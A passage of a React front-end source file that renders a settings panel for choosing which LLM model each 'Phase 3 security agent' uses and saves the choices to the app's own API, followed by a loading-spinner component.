    'claude-3.5-sonnet-20241022', 'claude-3.5-haiku-20241022', 'claude-3-opus-20240229',

    'gpt-4o', 'gpt-4o-mini', 'gpt-4-turbo',

    'llama-3.3-70b-versatile', 'llama-3.1-70b-versatile', 'llama-3.1-8b-instant',

    'gemini-2.0-flash-exp', 'gemini-1.5-pro'

  ]



  const handleSave = async () => {

    setLoading(true)

    try {

      const res = await fetch('/api/config/agent-models', {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ agents: agentConfigs }),

      })

      const data = await res.json()

      if (data.status === 'ok') {

        alert('Configuration saved!')

      }

    } catch (e) {

      console.error('Failed to save:', e)

    } finally {

      setLoading(false)

    }

  }



  return (

    <div>

      <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>🤖 Agent Model Configuration</h2>

      <p style={{ color: '#666', marginBottom: '32px' }}>Configure a specific model for each Phase 3 security agent</p>



      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(350px, 1fr))', gap: '16px', marginBottom: '24px' }}>

        {agents.map(agent => (

          <div key={agent.id} style={{

            background: 'rgba(15, 15, 26, 0.95)',

            borderRadius: '16px',

            padding: '20px',

            border: '1px solid rgba(255,255,255,0.05)'

          }}>

            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>

              <div style={{ fontSize: '24px' }}>{agent.name.split(' ')[0]}</div>

              <div>

                <div style={{ fontSize: '14px', fontWeight: '600' }}>{agent.name.split(' ').slice(1).join(' ')}</div>

                <div style={{ fontSize: '11px', color: '#666' }}>{agent.description}</div>

              </div>

            </div>

            <select

              value={agentConfigs[agent.id] || models[0]}

              onChange={(e) => setAgentConfigs(prev => ({ ...prev, [agent.id]: e.target.value }))}

              style={{

                width: '100%',

                background: 'rgba(0,0,0,0.3)',

                border: '1px solid rgba(255,255,255,0.1)',

                borderRadius: '8px',

                padding: '12px',

                color: '#00d4ff',

                fontSize: '13px',

                fontFamily: 'monospace'

              }}

            >

              {models.map(m => (

                <option key={m} value={m}>{m}</option>

              ))}

            </select>

          </div>

        ))}

      </div>



      <button 

        onClick={handleSave} 

        disabled={loading}

        style={{

          background: loading ? 'rgba(255,255,255,0.1)' : 'linear-gradient(135deg, #00d4ff, #00ff88)',

          color: loading ? '#666' : '#000',

          border: 'none',

          borderRadius: '10px',

          padding: '14px 28px',

          fontWeight: '700',

          cursor: loading ? 'not-allowed' : 'pointer',

          fontSize: '14px'

        }}>

        {loading ? 'Saving...' : 'Save Agent Configuration'}

      </button>

    </div>

  )

}



function LoadingSpinner() {

  return (

    <div style={{ display: 'flex', justifyContent: 'center', padding: '80px' }}>

      <div style={{

        width: '48px',

        height: '48px',

        border: '3px solid rgba(255,255,255,0.1)',

        borderTopColor: '#00d4ff',

        borderRadius: '50%',

        animation: 'spin 1s linear infinite'

      }} />

    </div>

  )

}



export default App